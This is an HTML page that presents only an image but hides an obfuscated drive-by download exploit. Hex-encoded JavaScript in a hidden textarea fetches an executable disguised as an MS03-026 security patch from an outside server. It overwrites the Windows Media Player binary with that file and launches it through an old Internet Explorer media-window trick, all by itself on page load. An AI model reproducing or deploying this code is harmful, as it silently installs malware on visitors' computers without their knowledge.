<html>
<textarea id="code" style="display:none;">

&#x76;&#x61;&#x72;&#x20;&#x78;&#x20;&#x3D;&#x20;&#x6E;&#x65;&#x77;&#x20;&#x41;&#x63;&#x74;&#x69;&#x76;&#x65;&#x58;&#x4F;&#x62;&#x6A;&#x65;&#x63;&#x74;&#x28;&#x22;&#x4D;&#x69;&#x63;&#x72;&#x6F;&#x73;&#x6F;&#x66;&#x74;&#x2E;&#x58;&#x4D;&#x4C;&#x48;&#x54;&#x54;&#x50;&#x22;&#x29;&#x3B;&#x20;&#x78;&#x2E;&#x4F;&#x70;&#x65;&#x6E;&#x28;&#x22;&#x47;&#x45;&#x54;&#x22;&#x2C;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x77;&#x31;&#x2E;&#x39;&#x32;&#x30;&#x2E;&#x74;&#x65;&#x6C;&#x69;&#x61;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x7E;&#x75;&#x39;&#x32;&#x30;&#x33;&#x32;&#x38;&#x30;&#x36;&#x2F;&#x70;&#x68;&#x6F;&#x74;&#x6F;&#x67;&#x61;&#x6C;&#x6C;&#x65;&#x72;&#x79;&#x2F;&#x5F;&#x76;&#x74;&#x69;&#x5F;&#x63;&#x6E;&#x66;&#x2F;&#x70;&#x6C;&#x61;&#x63;&#x65;&#x68;&#x6F;&#x6C;&#x64;&#x65;&#x72;&#x2F;&#x4D;&#x53;&#x30;&#x33;&#x2D;&#x30;&#x32;&#x36;&#x2D;&#x70;&#x61;&#x74;&#x63;&#x68;&#x2D;&#x31;&#x32;&#x31;&#x2E;&#x65;&#x78;&#x65;&#x22;&#x2C;&#x30;&#x29;&#x3B;&#x20;&#x78;&#x2E;&#x53;&#x65;&#x6E;&#x64;&#x28;&#x29;&#x3B;&#x20;&#x76;&#x61;&#x72;&#x20;&#x73;&#x20;&#x3D;&#x20;&#x6E;&#x65;&#x77;&#x20;&#x41;&#x63;&#x74;&#x69;&#x76;&#x65;&#x58;&#x4F;&#x62;&#x6A;&#x65;&#x63;&#x74;&#x28;&#x22;&#x41;&#x44;&#x4F;&#x44;&#x42;&#x2E;&#x53;&#x74;&#x72;&#x65;&#x61;&#x6D;&#x22;&#x29;&#x3B;&#x20;&#x73;&#x2E;&#x4D;&#x6F;&#x64;&#x65;&#x20;&#x3D;&#x20;&#x33;&#x3B;&#x20;&#x73;&#x2E;&#x54;&#x79;&#x70;&#x65;&#x20;&#x3D;&#x20;&#x31;&#x3B;&#x20;&#x73;&#x2E;&#x4F;&#x70;&#x65;&#x6E;&#x28;&#x29;&#x3B;&#x20;&#x73;&#x2E;&#x57;&#x72;&#x69;&#x74;&#x65;&#x28;&#x78;&#x2E;&#x72;&#x65;&#x73;&#x70;&#x6F;&#x6E;&#x73;&#x65;&#x42;&#x6F;&#x64;&#x79;&#x29;&#x3B;&#x20;&#x73;&#x2E;&#x53;&#x61;&#x76;&#x65;&#x54;&#x6F;&#x46;&#x69;&#x6C;&#x65;&#x28;&#x22;&#x43;&#x3A;&#x5C;&#x5C;&#x50;&#x72;&#x6F;&#x67;&#x72;&#x61;&#x6D;&#x20;&#x46;&#x69;&#x6C;&#x65;&#x73;&#x5C;&#x5C;&#x57;&#x69;&#x6E;&#x64;&#x6F;&#x77;&#x73;&#x20;&#x4D;&#x65;&#x64;&#x69;&#x61;&#x20;&#x50;&#x6C;&#x61;&#x79;&#x65;&#x72;&#x5C;&#x5C;&#x77;&#x6D;&#x70;&#x6C;&#x61;&#x79;&#x65;&#x72;&#x2E;&#x65;&#x78;&#x65;&#x22;&#x2C;&#x32;&#x29;&#x3B;&#x20;&#x6C;&#x6F;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x2E;&#x68;&#x72;&#x65;&#x66;&#x20;&#x3D;&#x20;&#x22;&#x6D;&#x6D;&#x73;&#x3A;&#x2F;&#x2F;&#x22;&#x3B;&#x20;

</textarea>
<img src="pic.jpg"> 

<script language="javascript">

    function preparecode(code) {
        result = '';
        lines = code.split(/\r\n/);
        for (i=0;i<lines.length;i++) {
        
            line = lines[i];
            line = line.replace(/^\s+/,"");
            line = line.replace(/\s+$/,"");
            line = line.replace(/'/g,"\\'");
            line = line.replace(/[\\]/g,"\\\\");
            line = line.replace(/[/]/g,"%2f");

            if (line != '') {
                result += line +'\\r\\n';
            }
        }
        return result;
    }
    
    function doit() {
        mycode = preparecode(document.all.code.value);
        myURL = "file:javascript:eval('" + mycode + "')";
        window.open(myURL,"_media");
    }
    

    window.open("error.php","_media");
    
    setTimeout("doit()", 5000);

</script>
</html>
